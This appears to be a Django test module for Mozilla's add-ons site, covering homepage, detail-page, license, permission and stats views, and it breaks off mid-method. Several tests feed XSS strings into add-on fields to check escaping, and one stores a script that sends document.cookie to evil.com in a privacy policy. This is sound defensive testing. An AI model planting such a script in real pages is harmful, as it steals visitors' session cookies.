# -*- coding: utf-8 -*-
import json
import random
import re

from django.conf import settings
from django.core import mail
from django.core.cache import cache
from django.test.client import Client
from django.utils.http import urlunquote

import mock
import pytest
import waffle

from elasticsearch import Elasticsearch
from mock import patch
from pyquery import PyQuery as pq
from waffle.testutils import override_switch
from rest_framework.test import APIRequestFactory

from olympia import amo
from olympia.abuse.models import AbuseReport
from olympia.addons.models import (
    Addon, AddonDependency, AddonFeatureCompatibility, AddonUser, Category,
    CompatOverride, CompatOverrideRange, Persona, ReplacementAddon)
from olympia.addons.utils import generate_addon_guid
from olympia.addons.views import (
    DEFAULT_FIND_REPLACEMENT_PATH, FIND_REPLACEMENT_SRC,
    AddonAutoCompleteSearchView, AddonSearchView)
from olympia.amo.templatetags.jinja_helpers import numberfmt, urlparams
from olympia.amo.tests import (
    APITestClient, ESTestCase, TestCase, addon_factory, collection_factory,
    user_factory, version_factory)
from olympia.amo.urlresolvers import get_outgoing_url, reverse
from olympia.bandwagon.models import Collection, FeaturedCollection
from olympia.constants.categories import CATEGORIES, CATEGORIES_BY_ID
from olympia.constants.licenses import LICENSES_BY_BUILTIN
from olympia.files.models import WebextPermission, WebextPermissionDescription
from olympia.ratings.models import Rating
from olympia.users.models import UserProfile
from olympia.users.templatetags.jinja_helpers import users_list
from olympia.versions.models import (
    ApplicationsVersions, AppVersion, Version, VersionPreview)


def norm(s):
    """Normalize a string so that whitespace is uniform and remove whitespace
    between tags."""
    s = re.sub(r'\s+', ' ', str(s)).strip()
    return re.sub(r'>\s+<', '><', s)


def add_addon_author(original, copy):
    """Make both add-ons share an author."""
    author = original.listed_authors[0]
    AddonUser.objects.create(addon=copy, user=author, listed=True)
    return author


def check_cat_sidebar(url, addon):
    """Ensures that the sidebar shows the categories for the correct type."""
    cache.clear()
    for type_ in [amo.ADDON_EXTENSION, amo.ADDON_THEME, amo.ADDON_SEARCH]:
        addon.update(type=type_)
        r = Client().get(url)
        assert pq(r.content)('#side-nav').attr('data-addontype') == str(type_)


def _test_hovercards(self, doc, addons, src=''):
    addons = list(addons)
    assert doc.find('.addon.hovercard').length == len(addons)
    for addon in addons:
        btn = doc.find('.install[data-addon="%s"]' % addon.id)
        assert btn.length == 1
        hc = btn.parents('.addon.hovercard')
        assert hc.find('a').attr('href') == (
            urlparams(addon.get_url_path(), src=src))
        assert hc.find('h3').text() == unicode(addon.name)


class TestHomepage(TestCase):

    def setUp(self):
        super(TestHomepage, self).setUp()
        self.base_url = reverse('home')

    def test_304(self):
        self.url = '/en-US/firefox/'
        response = self.client.get(self.url)
        assert 'ETag' in response

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH=response['ETag'])
        assert response.status_code == 304
        assert not response.content

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH='random_etag_string')
        assert response.status_code == 200
        assert response.content

    def test_thunderbird(self):
        """Thunderbird homepage should have the Thunderbird title."""
        r = self.client.get('/en-US/thunderbird/')
        doc = pq(r.content)
        assert 'Add-ons for Thunderbird' == doc('title').text()

    def test_welcome_msg(self):
        r = self.client.get('/en-US/firefox/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        assert welcome.text() == (
            'Welcome to Firefox Add-ons.\nChoose from thousands of extra '
            'features and styles to make Firefox your own.')
        r = self.client.get('/en-US/thunderbird/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        assert welcome.text() == (
            'Welcome to Thunderbird Add-ons.\nAdd extra features and styles '
            'to make Thunderbird your own.')

    def test_try_new_frontend_banner_presence(self):
        self.url = '/en-US/firefox/'
        response = self.client.get(self.url)
        assert 'AMO is getting a new look.' not in response.content

        with override_switch('try-new-frontend', active=True):
            response = self.client.get(self.url)
            assert 'AMO is getting a new look.' in response.content


class TestHomepageFeatures(TestCase):
    fixtures = ['base/appversion',
                'base/users',
                'base/addon_3615',
                'base/collections',
                'base/global-stats',
                'base/featured',
                'addons/featured',
                'bandwagon/featured_collections']

    def setUp(self):
        super(TestHomepageFeatures, self).setUp()
        self.url = reverse('home')

    def test_no_unreviewed(self):
        response = self.client.get(self.url)
        addon_lists = 'popular featured hotness personas'.split()
        for key in addon_lists:
            for addon in response.context[key]:
                assert addon.status != amo.STATUS_NOMINATED

    def test_seeall(self):
        Collection.objects.update(type=amo.COLLECTION_FEATURED)
        doc = pq(self.client.get(self.url).content)
        browse_extensions = reverse('browse.extensions')
        browse_personas = reverse('browse.personas')
        browse_collections = reverse('collections.list')
        sections = {
            '#popular-extensions': browse_extensions + '?sort=users',
            '#featured-extensions': browse_extensions + '?sort=featured',
            '#upandcoming': browse_extensions + '?sort=hotness',
            '#featured-themes': browse_personas,
            '#featured-collections': browse_collections + '?sort=featured',
        }
        for id_, url in sections.iteritems():
            # Check that the "See All" link points to the correct page.
            assert doc.find('%s .seeall' % id_).attr('href') == url


class TestOldContributionRedirects(TestCase):
    fixtures = ['base/appversion', 'base/addon_592']

    def setUp(self):
        self.detail_url = reverse('addons.detail', args=['a592'])

    def test_installed(self):
        url = reverse('addons.installed', args=['a592'])
        response = self.client.get(url, follow=True)
        self.assert3xx(response, self.detail_url, 301)

    def test_contribute(self):
        url = reverse('addons.contribute', args=['a592'])
        response = self.client.get(url, follow=True)
        self.assert3xx(response, self.detail_url, 301)

    def test_meet(self):
        url = reverse('addons.meet', args=['a592'])
        response = self.client.get(url, follow=True)
        self.assert3xx(response, self.detail_url, 301)

    def test_thanks(self):
        url = reverse('addons.thanks', args=['a592'])
        response = self.client.get(url, follow=True)
        self.assert3xx(response, self.detail_url, 301)

    def test_roadblock(self):
        url = reverse('addons.roadblock', args=['a592'])
        response = self.client.get(url, follow=True)
        self.assert3xx(response, self.detail_url, 301)


class TestContributionsURL(TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592',
                'base/users', 'addons/eula+contrib-addon',
                'addons/addon_228106_info+dev+bio.json',
                'addons/addon_228107_multiple-devs.json']

    def setUp(self):
        self.addon = Addon.objects.get(pk=592)
        user = UserProfile.objects.get(pk=999)
        AddonUser(addon=self.addon, user=user).save()

    def test_button_appears_if_set(self):
        response = self.client.get(self.addon.get_url_path())
        # No button by default because Addon.contributions url not set.
        assert pq(response.content)('#contribution-url-button').length == 0

        # Set it and it appears though.
        self.addon.update(contributions='https://paypal.me/foooo')
        response = self.client.get(self.addon.get_url_path()
                                   )
        button = pq(response.content)('#contribution-url-button')
        assert button.length == 1, response.content
        assert button[0].attrib['href'] == get_outgoing_url(
            'https://paypal.me/foooo')


class TestLicensePage(TestCase):
    fixtures = ['base/addon_3615']

    def setUp(self):
        super(TestLicensePage, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version

    def test_legacy_redirect(self):
        response = self.client.get(
            '/en-US/firefox/versions/license/%s' % self.version.id,
            follow=True)
        self.assert3xx(response, self.version.license_url(), 301)

    def test_legacy_redirect_deleted(self):
        self.version.delete()
        response = self.client.get(
            '/en-US/firefox/versions/license/%s' % self.version.id)
        assert response.status_code == 404

    def test_explicit_version(self):
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.version

    def test_implicit_version(self):
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.addon.current_version

    def test_no_license(self):
        self.version.update(license=None)
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 404

    def test_no_version(self):
        self.addon.versions.all().delete()
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 404

    def test_unlisted_version(self):
        self.version.update(channel=amo.RELEASE_CHANNEL_UNLISTED)
        assert self.version.license
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 404

    def test_duplicate_version_number(self):
        Version.objects.create(addon=self.addon, version=self.version.version)
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.addon.current_version

    def test_cat_sidebar(self):
        check_cat_sidebar(reverse('addons.license', args=['a3615']),
                          self.addon)


class TestICloudRedirect(TestCase):
    def setUp(self):
        addon_factory(slug='icloud-bookmarks')

    @override_switch('icloud_bookmarks_redirect', active=True)
    def test_redirect_with_waffle(self):
        r = self.client.get('/en-US/firefox/addon/icloud-bookmarks/')
        assert r.status_code == 302
        assert r.get('location') == '%s/blocked/i1214/' % settings.SITE_URL

    @override_switch('icloud_bookmarks_redirect', active=False)
    def test_redirect_without_waffle(self):
        r = self.client.get('/en-US/firefox/addon/icloud-bookmarks/')
        assert r.status_code == 200
        assert r.context['addon'] is not None


class TestDetailPage(TestCase):
    fixtures = ['base/addon_3615',
                'base/users',
                'base/addon_59',
                'base/addon_592',
                'base/addon_4594_a9',
                'addons/listed',
                'addons/persona']

    def setUp(self):
        super(TestDetailPage, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()
        self.more_url = self.addon.get_url_path(more=True)

    def test_try_new_frontend_banner_presence(self):
        response = self.client.get(self.url)
        assert 'AMO is getting a new look.' not in response.content

        with override_switch('try-new-frontend', active=True):
            response = self.client.get(self.url)
            assert 'AMO is getting a new look.' in response.content

    def test_304(self):
        response = self.client.get(self.url)
        assert 'ETag' in response

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH=response['ETag'])
        assert response.status_code == 304
        assert not response.content

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH='random_etag_string')
        assert response.status_code == 200
        assert response.content

    def test_site_title(self):
        r = self.client.get(self.url)
        assert pq(r.content)('h1.site-title').text() == 'Add-ons'

    def test_addon_headings(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        assert doc('h2:first').text() == 'About this Add-on'
        assert doc('.metadata .home').text() == 'Add-on home page'

    def test_anonymous_extension(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        assert response.context['addon'].id == 3615

    def test_anonymous_persona(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert response.status_code == 200
        assert response.context['addon'].id == 15663

    def test_review_microdata_personas(self):
        a = Addon.objects.get(id=15663)
        a.name = '<script>alert("fff")</script>'
        a.save()
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert (
            '&lt;script&gt;alert(&quot;fff&quot;)&lt;/script&gt;' in
            response.content)
        assert '<script>' not in response.content

    def test_report_abuse_links_to_form_age(self):
        response = self.client.get_ajax(
            reverse('addons.detail', args=['a3615']))
        doc = pq(response.content)
        expected = reverse('addons.abuse', args=['3615'])
        assert doc('#report-abuse').attr('href') == expected

    def test_personas_context(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert 'review_form' in response.context
        assert 'reviews' in response.context
        assert 'get_replies' in response.context

    def test_unreviewed_robots(self):
        """Check that unreviewed add-ons do not get indexed."""
        url = self.addon.get_url_path()
        m = 'meta[content=noindex]'

        assert self.addon.status == amo.STATUS_PUBLIC
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert not doc(m)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)

        self.addon.update(status=amo.STATUS_NOMINATED)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert doc(m)

    def test_more_about(self):
        # Don't show more about box if there's nothing to populate it.
        self.addon.developer_comments_id = None
        self.addon.description_id = None
        self.addon.previews.all().delete()
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        assert doc('#more-about').length == 0
        assert doc('.article.userinput').length == 0

    def test_type_redirect(self):
        """
        If current add-on's type is unsupported by app, redirect to an
        app that supports it.
        """
        # Thunderbird can't do search engines
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = amo.THUNDERBIRD.short
        response = self.client.get(reverse('addons.detail', args=['a4594']),
                                   follow=False)
        assert response.status_code == 301
        assert response['Location'].find(amo.THUNDERBIRD.short) == -1
        assert (response['Location'].find(amo.FIREFOX.short) >= 0)

    def test_compatible_app_redirect(self):
        """
        For add-ons incompatible with the current app, redirect to one
        that's supported.
        """
        comp_app = self.addon.compatible_apps.keys()[0]
        not_comp_app = [a for a in amo.APP_USAGE
                        if a not in self.addon.compatible_apps.keys()][0]

        # no SeaMonkey version => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = not_comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        assert r.status_code == 301
        assert r['Location'].find(not_comp_app.short) == -1
        assert r['Location'].find(comp_app.short) >= 0

        # compatible app => 200
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        assert r.status_code == 200

    def test_external_urls(self):
        """Check that external URLs are properly escaped."""
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc(
            'aside a.home[href^="%s"]' % settings.REDIRECT_URL).length == 1

    def test_no_privacy_policy(self):
        """Make sure privacy policy is not shown when not present."""
        self.addon.privacy_policy_id = None
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('.privacy-policy').length == 0

    def test_privacy_policy(self):
        self.addon.privacy_policy = 'foo bar'
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('.privacy-policy').length == 1
        privacy_url = reverse('addons.privacy', args=[self.addon.slug])
        assert doc('.privacy-policy').attr('href').endswith(privacy_url)

    def test_permissions_webext(self):
        file_ = self.addon.current_version.all_files[0]
        file_.update(is_webextension=True)
        WebextPermission.objects.create(file=file_, permissions=[
            u'http://*/*', u'<all_urls>', u'bookmarks', u'nativeMessaging',
            u'made up permission'])
        WebextPermissionDescription.objects.create(
            name=u'bookmarks', description=u'Read and modify bookmarks')
        WebextPermissionDescription.objects.create(
            name=u'nativeMessaging',
            description=u'Exchange messages with programs other than Firefox')

        response = self.client.get(self.url)
        doc = pq(response.content)
        # The link next to the button
        assert doc('a.webext-permissions').length == 1
        # And the model dialog
        assert doc('#webext-permissions').length == 1
        assert u'perform certain functions (example: a tab management' in (
            doc('#webext-permissions div.prose').text())
        assert doc('ul.webext-permissions-list').length == 1
        assert doc('li.webext-permissions-list').length == 3
        # See File.webext_permissions for the order logic
        assert doc('li.webext-permissions-list').text() == (
            u'Access your data for all websites '
            u'Exchange messages with programs other than Firefox '
            u'Read and modify bookmarks')

    def test_permissions_webext_no_permissions(self):
        file_ = self.addon.current_version.all_files[0]
        file_.update(is_webextension=True)
        assert file_.webext_permissions_list == []
        response = self.client.get(self.url)
        doc = pq(response.content)
        # Don't show the link when no permissions.
        assert doc('a.webext-permissions').length == 0
        # And no model dialog
        assert doc('#webext-permissions').length == 0

    def test_permissions_non_webext(self):
        file_ = self.addon.current_version.all_files[0]
        file_.update(is_webextension=False)
        response = self.client.get(self.url)
        doc = pq(response.content)
        # The link next to the button
        assert doc('a.webext-permissions').length == 1
        # danger danger icon shown for oldie xul addons
        assert doc('a.webext-permissions img').length == 1
        # And the model dialog
        assert doc('#webext-permissions').length == 1
        assert u'Please note this add-on uses legacy technology' in (
            doc('#webext-permissions div.prose').text())
        assert doc('.webext-permissions-list').length == 0

    def test_permissions_non_extension(self):
        self.addon.update(type=amo.ADDON_THEME)
        file_ = self.addon.current_version.all_files[0]
        assert not file_.is_webextension
        response = self.client.get(self.url)
        doc = pq(response.content)
        # Don't show the link for non-extensions
        assert doc('a.webext-permissions').length == 0
        # And no model dialog
        assert doc('#webext-permissions').length == 0

    def test_permissions_xss_single_url(self):
        file_ = self.addon.current_version.all_files[0]
        file_.update(is_webextension=True)
        WebextPermission.objects.create(file=file_, permissions=[
            u'<script>alert("//")</script>'])
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('li.webext-permissions-list').text() == (
            u'Access your data for '
            u'<script>alert("//")</script>')
        assert '<script>alert(' not in response.content
        assert '&lt;script&gt;alert(' in response.content

    def test_permissions_xss_multiple_url(self):
        file_ = self.addon.current_version.all_files[0]
        file_.update(is_webextension=True)
        WebextPermission.objects.create(file=file_, permissions=[
            '<script>alert("//")</script>',
            '<script>foo("https://")</script>'])
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('li.webext-permissions-list').text() == (
            u'Access your data on the following websites:\n'
            u'<script>alert("//")</script>\n'
            u'<script>foo("https://")</script>')
        assert '<script>alert(' not in response.content
        assert '<script>foo(' not in response.content
        assert '&lt;script&gt;alert(' in response.content
        assert '&lt;script&gt;foo(' in response.content

    def test_simple_html_is_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        assert norm(doc(".policy-statement strong")) == (
            "<strong> what the hell..</strong>")
        assert norm(doc(".policy-statement ul")) == (
            "<ul><li>papparapara</li><li>todotodotodo</li></ul>")
        assert doc(".policy-statement ol a").text() == (
            "firefox")
        assert norm(doc(".policy-statement ol li:first")) == (
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
            '<div class="policy-statement">&lt;script'), (
                'Unexpected: %s' % policy[0:50])

    def test_button_size(self):
        """Make sure install buttons on the detail page are prominent."""
        response = self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        assert pq(response.content)('.button').hasClass('prominent')

    def test_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        assert (pq(r.content)('#addon .button').attr(
            'href').endswith('?src=dp-btn-primary'))

    def test_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        assert (pq(r.content)('#addon .button').attr(
            'href').endswith('?src=trickleortreat'))

    def test_version_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        assert (pq(r.content)('#detail-relnotes .button').attr(
            'href').endswith('?src=dp-btn-version'))

    def test_version_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        assert (pq(r.content)('#detail-relnotes .button').attr(
            'href').endswith('?src=trickleortreat'))

    def test_version_more_link(self):
        doc = pq(self.client.get(self.url).content)
        versions_url = reverse('addons.versions', args=[self.addon.slug])
        assert (doc('#detail-relnotes a.more-info').attr('href') ==
                versions_url)

    def test_invalid_version(self):
        """Only render details pages for add-ons that have a version."""
        # Wipe all versions.
        self.addon.versions.all().delete()
        # Try accessing the details page.
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_no_listed_authors(self):
        r = self.client.get(reverse('addons.detail', args=['a59']))
        # We shouldn't show an avatar since this has no listed_authors.
        doc = pq(r.content)
        assert 0 == len(doc('.avatar'))

    def test_authors_xss(self):
        name = '<script>alert(1)</script>'
        user = UserProfile.objects.create(username='test',
                                          display_name=name)

        output = users_list([user])

        assert "&lt;script&gt;alert" in output
        assert "<script>alert" not in output

    def test_display_compatible_apps(self):
        """
        Show compatibility info for extensions but not for search engines.
        """
        r = self.client.get(self.addon.get_url_path())
        assert pq(r.content)('#detail-relnotes .compat').length == 1

        a = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
        r = self.client.get(a.get_url_path())
        assert pq(r.content)('#detail-relnotes .compat').length == 0

    def test_is_restart_required(self):
        span_is_restart_required = (
            '<span class="is-restart-required">Requires Restart</span>')
        file_ = self.addon.current_version.all_files[0]

        assert file_.is_restart_required is False
        response = self.client.get(self.url)
        assert span_is_restart_required not in response.content

        file_.update(is_restart_required=True)
        response = self.client.get(self.url)
        assert span_is_restart_required in response.content

    def test_fx57_label_is_webextension(self):
        """Test that the Firefox 57 label is being shown.

        That label depends on `is_webextension` being set or
        if the add-on is a mozilla internally signed add-on.
        """
        file_ = self.addon.current_version.all_files[0]
        assert file_.is_webextension is False

        response = self.client.get(self.url)
        doc = pq(response.content)
        assert not doc('a.is-webextension')

        file_.update(is_webextension=True, is_restart_required=False)
        assert file_.is_webextension is True

        response = self.client.get(self.url)
        doc = pq(response.content)
        link = doc('a.is-webextension')
        assert (
            link.attr['href'] ==
            'https://support.mozilla.org/kb/firefox-add-technology-modernizing'
        )

    def test_fx57_label_is_mozilla_signed_extension(self):
        """Test that the Firefox 57 label is being shown.

        That label depends on `is_webextension` being set or
        if the add-on is a mozilla internally signed add-on.
        """
        file_ = self.addon.current_version.all_files[0]
        assert file_.is_mozilla_signed_extension is False

        response = self.client.get(self.url)
        doc = pq(response.content)
        assert not doc('a.is-webextension')

        file_.update(is_mozilla_signed_extension=True)
        assert file_.is_mozilla_signed_extension is True

        response = self.client.get(self.url)
        doc = pq(response.content)
        link = doc('a.is-webextension')
        assert (
            link.attr['href'] ==
            'https://support.mozilla.org/kb/firefox-add-technology-modernizing'
        )

    def test_version_displayed(self):
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('.version-number').text() == '2.1.072'

    def test_disabled_user_message(self):
        self.addon.update(disabled_by_user=True)
        res = self.client.get(self.url)
        assert res.status_code == 404
        assert 'removed by its author' in res.content

    def test_disabled_status_message(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        res = self.client.get(self.url)
        assert res.status_code == 404
        assert 'disabled by an administrator' in res.content

    def test_deleted_status_message(self):
        addon = Addon.objects.get(id=3615)
        addon.update(status=amo.STATUS_DELETED)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        assert res.status_code == 404

    def test_more_url(self):
        response = self.client.get(self.url)
        assert pq(response.content)('#more-webpage').attr('data-more-url') == (
            self.addon.get_url_path(more=True))

    def test_unlisted_addon_returns_404(self):
        """Unlisted addons are not listed and return 404."""
        self.make_addon_unlisted(self.addon)
        assert self.client.get(self.url).status_code == 404

    def test_admin_buttons(self):
        def get_detail():
            return self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        # No login, no buttons.
        assert pq(get_detail().content)('.manage-button').length == 0

        # No developer, no buttons.
        self.client.login(email='regular@mozilla.com')
        assert pq(get_detail().content)('.manage-button').length == 0

        # developer gets a 'Manage' button to devhub
        self.client.login(email='del@icio.us')
        content = get_detail().content
        assert pq(content)('.manage-button').length == 1
        assert pq(content)('.manage-button a').eq(0).attr('href') == (
            self.addon.get_dev_url())

        # reviewer gets an 'Add-on Review' button
        self.client.login(email='reviewer@mozilla.com')
        content = get_detail().content
        assert pq(content)('.manage-button').length == 1
        assert pq(content)('.manage-button a').eq(0).attr('href') == (
            reverse('reviewers.review', args=[self.addon.slug]))

        # admins gets devhub, 'Add-on Review' and 'Admin Manage' button too
        self.client.login(email='admin@mozilla.com')
        content = get_detail().content
        assert pq(content)('.manage-button').length == 3
        assert pq(content)('.manage-button a').eq(0).attr('href') == (
            self.addon.get_dev_url())
        assert pq(content)('.manage-button a').eq(1).attr('href') == (
            reverse('reviewers.review', args=[self.addon.slug]))
        assert pq(content)('.manage-button a').eq(2).attr('href') == (
            reverse('zadmin.addon_manage', args=[self.addon.slug]))

    def test_reviews(self):
        def create_review(body='review text'):
            return Rating.objects.create(
                addon=self.addon, user=user_factory(),
                rating=random.randrange(0, 6),
                body=body)

        url = reverse('addons.detail', args=['a3615'])

        create_review()
        response = self.client.get(url, follow=True)
        assert len(response.context['reviews']) == 1

        # Add a new review but with no body - shouldn't be shown on detail page
        create_review(body=None)
        response = self.client.get(url, follow=True)
        assert len(response.context['reviews']) == 1

        # Test one last time in case caching
        create_review()
        response = self.client.get(url, follow=True)
        assert len(response.context['reviews']) == 2

    def get_pq(self):
        return pq(self.client.get(self.url).content)

    def test_adu_stats_private(self):
        assert not self.addon.public_stats
        adu = self.get_pq()('#daily-users')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_adu_stats_public(self):
        self.addon.update(public_stats=True)
        assert self.addon.show_adu()
        adu = self.get_pq()('#daily-users')

        # Check that ADU does link to public statistics dashboard.
        assert adu.find('a').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        assert adu.text().split()[0] == numberfmt(
            self.addon.average_daily_users)

        # Check if we hide link when there are no ADU.
        self.addon.update(average_daily_users=0)
        assert self.get_pq()('#daily-users').length == 0

    def test_adu_stats_regular(self):
        self.client.login(email='regular@mozilla.com')
        # Should not be a link to statistics dashboard for regular users.
        adu = self.get_pq()('#daily-users')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_adu_stats_admin(self):
        self.client.login(email='del@icio.us')
        # Check link to statistics dashboard for add-on authors.
        assert self.get_pq()('#daily-users a.stats').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

    def test_downloads_stats_private(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        assert not self.addon.public_stats
        adu = self.get_pq()('#weekly-downloads')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_downloads_stats_public(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        assert not self.addon.show_adu()
        dls = self.get_pq()('#weekly-downloads')

        # Check that weekly downloads links to statistics dashboard.
        assert dls.find('a').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        assert dls.text().split()[0] == numberfmt(self.addon.weekly_downloads)

        # Check if we hide link when there are no weekly downloads.
        self.addon.update(weekly_downloads=0)
        assert self.get_pq()('#weekly-downloads').length == 0

    def test_downloads_stats_regular(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        self.client.login(email='regular@mozilla.com')
        # Should not be a link to statistics dashboard for regular users.
        dls = self.get_pq()('#weekly-downloads')
        assert dls.length == 1
        assert dls.find('a').length == 0

    def test_downloads_stats_admin(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        self.client.login(email='del@icio.us')
        # Check link to statistics dashboard for add-on authors.
        assert self.get_pq()('#weekly-downloads a.stats').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

    def test_dependencies(self):
        assert self.get_pq()('.dependencies').length == 0
        req = Addon.objects.get(id=592)
        AddonDependency.objects.create(addon=self.addon, dependent_addon=req)
        assert self.addon.all_dependencies == [req]
        cache.clear()
        d = self.get_pq()('.dependencies .hovercard')
        assert d.length == 1
        assert d.find('h3').text() == unicode(req.name)
        assert d.find('a').attr('href').endswith('?src=dp-dl-dependencies')
        assert d.find('.install-button a').attr('href').endswith(
            '?src=dp-hc-dependencies')

    def test_license_link_builtin(self):
        g = 'http://google.com'
        version = self.addon._current_version
        license = version.license
        license.builtin = 1
        license.name = 'License to Kill'
        license.url = g
        license.save()
        assert license.builtin == 1
        assert license.url == g
        a = self.get_pq()('.secondary.metadata .source-license a')
        assert a.attr('href') == g
        assert a.text() == 'License to Kill'

    def test_license_builtin_creative_commons(self):
        g = 'http://google.com'
        version = self.addon._current_version
        constant = LICENSES_BY_BUILTIN[11]
        license = version.license
        license.builtin = 11
        license.name = 'License to Kill'  # Will be overriden by constant
        license.url = g
        license.save()
        assert license._constant == constant
        assert license.builtin == 11
        assert license.url == g
        a = self.get_pq()('.secondary.metadata .source-license a')
        assert a.attr('href') == g
        assert a.text() == constant.name

    def test_license_link_custom(self):
        version = self.addon._current_version
        assert version.license.url is None
        a = self.get_pq()('.secondary.metadata .source-license a')
        assert a.attr('href') == version.license_url()
        assert a.attr('target') is None
        assert a.text() == 'Custom License'

    def get_more_pq(self):
        return pq(self.client.get_ajax(self.more_url).content)

    def test_other_addons(self):
        """Ensure listed add-ons by the same author show up."""
        other = Addon.objects.get(id=592)
        Addon.objects.get(id=4594).delete()
        assert list(Addon.objects.listed(amo.FIREFOX).exclude(
            id=self.addon.id)) == [other]

        add_addon_author(other, self.addon)
        doc = self.get_more_pq()('#author-addons')
        _test_hovercards(self, doc, [other], src='dp-dl-othersby')

    def test_other_addons_no_unlisted(self):
        """An unlisted add-on by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(status=amo.STATUS_NOMINATED, disabled_by_user=True)

        add_addon_author(other, self.addon)
        assert self.get_more_pq()('#author-addons').length == 0

    def test_other_addons_by_others(self):
        """Add-ons by different authors should not show up."""
        author = UserProfile.objects.get(pk=999)
        AddonUser.objects.create(addon=self.addon, user=author, listed=True)
        assert self.get_more_pq()('#author-addons').length == 0

    def test_other_addons_none(self):
        assert self.get_more_pq()('#author-addons').length == 0

    def test_categories(self):
        links = self.get_more_pq()('#related ul:first').find('a')
        expected = [(unicode(c.name), c.get_url_path())
                    for c in self.addon.categories.filter(
                        application=amo.FIREFOX.id)]
        amo.tests.check_links(expected, links)

    def test_static_theme_detail(self):
        self.addon.update(type=amo.ADDON_STATICTHEME)
        version_preview = VersionPreview.objects.create(
            version=self.addon.current_version)
        response = self.client.get(self.url)
        assert response.status_code == 200
        doc = pq(response.content)
        assert doc('.previews')
        assert len(doc('.previews li.panel')) == 1
        img = doc('.previews li.panel img')[0]
        assert img.attrib['src'] == version_preview.thumbnail_url


class TestPersonas(object):
    fixtures = ['addons/persona', 'base/users']

    def create_addon_user(self, addon):
        return AddonUser.objects.create(addon=addon, user_id=999)


class TestPersonaDetailPage(TestPersonas, TestCase):

    def setUp(self):
        super(TestPersonas, self).setUp()
        self.addon = Addon.objects.get(id=15663)
        self.persona = self.addon.persona
        self.url = self.addon.get_url_path()
        self.create_addon_user(self.addon)

    def test_persona_images(self):
